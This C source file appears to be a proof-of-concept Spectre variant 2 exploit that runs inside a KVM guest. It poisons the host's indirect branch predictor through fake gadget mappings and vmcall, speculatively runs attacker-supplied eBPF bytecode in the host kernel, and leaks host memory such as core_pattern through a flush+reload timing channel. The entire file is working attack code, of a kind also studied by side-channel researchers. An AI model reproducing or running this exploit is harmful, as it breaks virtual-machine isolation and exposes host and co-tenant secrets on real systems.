#define _GNU_SOURCE
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <err.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <linux/filter.h>
#include <linux/bpf.h>

#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

// from PML4:511 to PML4:32
#define HYPER_DOWN(addr) ((addr) - 0xffffff8000000000 + 0x100000000000)

/* initially offsets from kretprobe_trace_func;
 * assumed to all be in a range of 0x1000, otherwise you'll have to fix up the mmap stuff
 */
unsigned long gadget_addrs[] = {
  0x22c, 0x27a, 0x7d2, 0x820
};
/* offset from gadget start to call */
unsigned long gadget_lens[] = {
  11, 7, 11, 7
};

/* initially offset from kvm_arch_vcpu_ioctl_run */
unsigned long target_call_instr_addr = 0xf06;

unsigned long host_page_offset;
unsigned long shm_page_host_kernel_virt_addr;
char *shm_page;
void (*mislead_fn)(void);

char *cur_time(void) {
  static char res[100];
  time_t t = time(NULL);
  strftime(res, sizeof(res), "[%T]", gmtime(&t));
  return res;
}

unsigned long pagemap_read_physaddr(unsigned long vaddr) {
  int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  if (pagemap_fd == -1)
    err(1, "physmap open");
  unsigned long pm_val;
  if (pread(pagemap_fd, &pm_val, 8, vaddr / 4096 * 8) != 8)
    err(1, "read pagemap");
  close(pagemap_fd);
  if ((pm_val & (1ULL<<63)) == 0)
    errx(1, "page not present");
  return (pm_val & 0x7fffffffffffff)*0x1000;
}

unsigned char call_to_rip_relative_memop_code[] = {
  0xFF, 0x15, 0xfa, 0x1f, 0x00, 0x00, /* call rip+0x2000-0x6 */
  0xc3, /* ret */
  0x0f, 0x0b /* ud2 */
};

int mislead_fn_call(unsigned long idx) {
  *((unsigned long *)HYPER_DOWN(target_call_instr_addr+0x2000)) = HYPER_DOWN(gadget_addrs[idx]);
  mislead_fn();
  return 0;
}

void do_vmcall() {
  // FIXME
  asm volatile(
    "mov %0, %%r8\n\t"
    "mov %0, %%r9\n\t"
    "vmcall\n\t"
    "vmcall"
    : /*out*/
    : "r"(shm_page_host_kernel_virt_addr/* + 0x800*/)/*in*/
    : "memory", "cc", "rax", "r8", "r9" /*hypervisor will clobber rax*/
  );
}

void user_flush_cacheline(void *arg) {
  asm volatile(
    "mov %%rsp, %%rax\n\t"
    "mov %%ss, %%rcx\n\t"
    "push %%rcx\n\t"
    "push %%rax\n\t"
    "pushf\n\t"
    "mov %%cs, %%rax\n\t"
    "push %%rax\n\t"
    "push $user_flush_cacheline_post_iret\n\t"
    "iretq\n\t"
    "user_flush_cacheline_post_iret:\n\t"
    "clflush %0"
  : "+m" (*(volatile char *)arg)
  : /* no inputs */
  : "ax", "bx", "cx", "dx", "cc");
}

int user_timed_reload(void *arg) {
  int tsc1, tsc2, read_copy;
  asm volatile(
    "mov %%rsp, %%rax\n\t"
    "mov %%ss, %%rcx\n\t"
    "push %%rcx\n\t"
    "push %%rax\n\t"
    "pushf\n\t"
    "mov %%cs, %%rax\n\t"
    "push %%rax\n\t"
    "push $user_timed_reload_iret1\n\t"
    "iretq\n\t"
    "user_timed_reload_iret1:\n\t"

    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %0\n\t"
    "mov (%3), %%eax\n\t"
    "mov %%eax, %2\n\t"
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %1\n\t"
  : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
  : "r"((unsigned int *)arg)
  : "ax", "bx", "cx", "dx");
  return tsc2 - tsc1;
}

// bit_idx in 0..7; 0 means leak byte&1, 1 means leak byte&2, 2 means leak byte&4.
// leaks to shm_page[0x800] or shm_page[0xc00].
int try_leak_bit_wonky(unsigned long target_byte_addr, int bit_idx, bool invert) {
  unsigned long host_timing_leak_addr = shm_page_host_kernel_virt_addr/* + 0x800*/;
  struct bpf_insn evil_bytecode_instrs[] = {
    // rax = target_byte_addr
    { .code = BPF_LD | BPF_IMM | BPF_DW, .dst_reg = 0, .imm = target_byte_addr }, { .imm = target_byte_addr>>32 },
    // rdi = timing_leak_array
    { .code = BPF_LD | BPF_IMM | BPF_DW, .dst_reg = 1, .imm = host_timing_leak_addr }, { .imm = host_timing_leak_addr>>32 },
    // rax = *(u8*)rax
    { .code = BPF_LDX | BPF_MEM | BPF_B, .dst_reg = 0, .src_reg = 0, .off = 0 },
    // rax = rax ^ (0x00 or 0xff)
    { .code = BPF_ALU64 | BPF_XOR | BPF_K, .dst_reg = 0, .imm = (invert ? 0xff : 0x00) },
    // rax = rax << ...
    { .code = BPF_ALU64 | BPF_LSH | BPF_K, .dst_reg = 0, .imm = 10 - bit_idx },
    // rax = rax & 0x400
    { .code = BPF_ALU64 | BPF_AND | BPF_K, .dst_reg = 0, .imm = 0x400 },
    // rax = rdi + rax
    { .code = BPF_ALU64 | BPF_ADD | BPF_X, .dst_reg = 0, .src_reg = 1 },
    // *rax = 0x42
    //{ .code = BPF_ST | BPF_MEM | BPF_B, .dst_reg = 0, .off = 0/*x800*/, .imm = 0x42 },
    { .code = BPF_LDX | BPF_MEM | BPF_B, .dst_reg = 0, .src_reg = 0, .off = 0x800 },
    // clear rdi (rdi = rdi & 0)
    { .code = BPF_ALU64 | BPF_AND | BPF_K, .dst_reg = 1, .imm = 0 },
    // end
    { .code = BPF_JMP | BPF_EXIT }
  };

  long bad_iterations = 0;
  time_t rt1 = time(NULL);
retry:;
  memcpy(shm_page + 128, evil_bytecode_instrs, sizeof(evil_bytecode_instrs));
  shm_page[0x800] = 1;
  shm_page[0xc00] = 1;

  for (int j=0; j<260; j++) mislead_fn_call(0);
  for (int j=0; j<461; j++) mislead_fn_call(1);
  for (int j=0; j<462; j++) mislead_fn_call(2);
  for (int j=0; j<463; j++) mislead_fn_call(3);
  for (int j=0; j<361; j++) mislead_fn_call(1);
  for (int j=0; j<333; j++) mislead_fn_call(3);
  for (int j=0; j<372; j++) mislead_fn_call(2);
  for (int j=0; j<390; j++) mislead_fn_call(0);

  user_flush_cacheline(shm_page + 0x800);
  user_flush_cacheline(shm_page + 0xc00);
  //user_timed_reload(shm_page);
  do_vmcall();
  int t1 = user_timed_reload(shm_page + 0x800);
  int t2 = user_timed_reload(shm_page + 0xc00);
  bool bit_is_0 = (t1 < 60);
  bool bit_is_1 = (t2 < 60);
  if (bit_is_1 != bit_is_0) {
    time_t rt2 = time(NULL);
    //printf("%s 0x%lx & 0x%x: wonky hit with %d vs %d%s   (after %ld bad iterations, %d seconds, %f tries/sec)\n",
    //    cur_time(), target_byte_addr, 1U<<bit_idx, t1, t2, invert?" [INVERTED]":"", bad_iterations, (int)(rt2-rt1), bad_iterations / (double)(rt2-rt1));
    return bit_is_1;
  } else {
    if (bit_is_0) {
      //printf("%s 0x%lx & 0x%x: wonky hit with %d vs %d [TWOCLEAR]%s\n", cur_time(), target_byte_addr, 1U<<bit_idx, t1, t2, invert?" [INVERTED]":"");
    }
    bad_iterations++;
    goto retry;
  }
}

int leak_bit(unsigned long target_byte_addr, int bit_idx) {
  for (unsigned long j = 0; ; j++) {
    bool invert = (j & 1);
    int wonky_bit = try_leak_bit_wonky(target_byte_addr, bit_idx, invert);
    /* discard both zero-bits and failed reads! */
    if (wonky_bit == 1) {
      int bit = invert ? 0 : 1;
      printf("%s 0x%lx & 0x%x: %d\n", cur_time(), target_byte_addr, 1U<<bit_idx, bit);
      return bit;
    }
  }
}

unsigned char leak_byte(unsigned long target_byte_addr) {
  unsigned char res = 0;
  for (int bit_idx = 0; bit_idx < 8; bit_idx++) {
    res |= leak_bit(target_byte_addr, bit_idx) << bit_idx;
  }
  printf("%s 0x%lx: 0x%02hhx\n", cur_time(), target_byte_addr, res);
  return res;
}

void leak_c_string(unsigned long target_addr) {
  char res[0x2000 + 1] = { 0 };
  for (int offset = 0; offset < 0x2000; offset++) {
    res[offset] = leak_byte(target_addr + offset);
    if (res[offset] == 0x00)
      break;
  }
  printf("%s 0x%lx: \"%s\"\n", cur_time(), target_addr, res);
}

int main(void) {
  setbuf(stdout, NULL);
  printf("host PAGE_OFFSET: ");
  scanf("%lx", &host_page_offset);
  shm_page = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE|MAP_LOCKED, -1, 0);
  if (shm_page == MAP_FAILED)
    err(1, "mmap");
  *(unsigned long *)shm_page = 0x1337733113377331;
  printf("host-physical address for guest-physical address 0x%lx: ", pagemap_read_physaddr((unsigned long)shm_page));
  unsigned long host_phys_addr;
  scanf("%lx", &host_phys_addr);
  shm_page_host_kernel_virt_addr = host_page_offset + host_phys_addr;
  printf("host-virtual kernel address for shared page: 0x%lx\n", shm_page_host_kernel_virt_addr);

  unsigned long host_kretprobe_trace_func_addr;
  printf("host-virtual kernel address of kretprobe_trace_func (see host's /proc/kallsyms): ");
  scanf("%lx", &host_kretprobe_trace_func_addr);
  for (int i=0; i<ARRSIZE(gadget_addrs); i++)
    gadget_addrs[i] += host_kretprobe_trace_func_addr;

  unsigned long host_kvm_arch_vcpu_ioctl_run_addr;
  printf("host-virtual kernel address of kvm_arch_vcpu_ioctl_run (see host's /proc/kallsyms): ");
  scanf("%lx", &host_kvm_arch_vcpu_ioctl_run_addr);
  target_call_instr_addr += host_kvm_arch_vcpu_ioctl_run_addr;
  printf("host indirect call should be at 0x%lx\n", target_call_instr_addr);

  printf("host-virtual kernel address of __bpf_prog_run (see host's /proc/kallsyms): ");
  unsigned long bpf_prog_run_addr;
  scanf("%lx", &bpf_prog_run_addr);

  printf("target data address, e.g. core_pattern (see host's /proc/kallsyms): ");
  unsigned long target_data_address;
  scanf("%lx", &target_data_address);

  ((unsigned long *)shm_page)[0] = bpf_prog_run_addr;
  ((unsigned long *)shm_page)[1] = shm_page_host_kernel_virt_addr + 128;

  unsigned long gadget_low_base = (HYPER_DOWN(gadget_addrs[0]) & ~0xfffUL) - 0x2000;
  errno = 0;
  void *gadget_mapping = mmap((void*)gadget_low_base, 0x8000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);
  if (gadget_mapping != (void*)gadget_low_base)
    err(1, "mmap gadget_mapping");

  unsigned long call_instr_low_base = HYPER_DOWN(target_call_instr_addr) & ~0xfffUL;
  errno = 0;
  void *call_instr_mapping = mmap((void*)call_instr_low_base, 0x4000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_LOCKED|MAP_POPULATE, -1, 0);
  if (call_instr_mapping != (void*)call_instr_low_base)
    err(1, "mmap call instr");

  unsigned long bpf_code_low_base = HYPER_DOWN(bpf_prog_run_addr) & ~0xfffUL;
  void *bpf_code_mapping = mmap((void*)bpf_code_low_base, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE|MAP_LOCKED, -1, 0);
  if (bpf_code_mapping != (void*)bpf_code_low_base)
    err(1, "mmap");
  ((unsigned char *)HYPER_DOWN(bpf_prog_run_addr))[0] = 0xc3; /* ret */
  ((unsigned char *)HYPER_DOWN(bpf_prog_run_addr))[1] = 0x0f; /* ud2 */
  ((unsigned char *)HYPER_DOWN(bpf_prog_run_addr))[2] = 0x0b;

  for (int i=0; i<ARRSIZE(gadget_addrs); i++) {
    int glen = gadget_lens[i];
    for (int j=0; j < glen; j++) {
      ((unsigned char *)HYPER_DOWN(gadget_addrs[i]))[j] = 0x90; /* nop */
    }
    memcpy((void*)HYPER_DOWN(gadget_addrs[i] + glen), call_to_rip_relative_memop_code, sizeof(call_to_rip_relative_memop_code));
    ((unsigned char *)HYPER_DOWN(gadget_addrs[i] + glen + sizeof(call_to_rip_relative_memop_code)))[0] = 0xc3; /* ret */
    ((unsigned char *)HYPER_DOWN(gadget_addrs[i] + glen + sizeof(call_to_rip_relative_memop_code)))[1] = 0x0f; /* ud2 */
    ((unsigned char *)HYPER_DOWN(gadget_addrs[i] + glen + sizeof(call_to_rip_relative_memop_code)))[2] = 0x0b;

    *(unsigned long *)HYPER_DOWN(gadget_addrs[i] + glen + 0x2000) = HYPER_DOWN(bpf_prog_run_addr);
  }

  memcpy((void*)HYPER_DOWN(target_call_instr_addr), call_to_rip_relative_memop_code, sizeof(call_to_rip_relative_memop_code));
  mislead_fn = (void*)HYPER_DOWN(target_call_instr_addr);

  printf("%s starting...\n", cur_time());
/*
  for (int bit_idx = 0; bit_idx < 8; bit_idx++) {
    for (int j=0; j<10; j++) {
retry:;
      int bit = try_leak_bit(target_data_address, bit_idx, j & 1);
      if (bit == -1) goto retry;
    }
  }
*/
  leak_c_string(target_data_address);
}
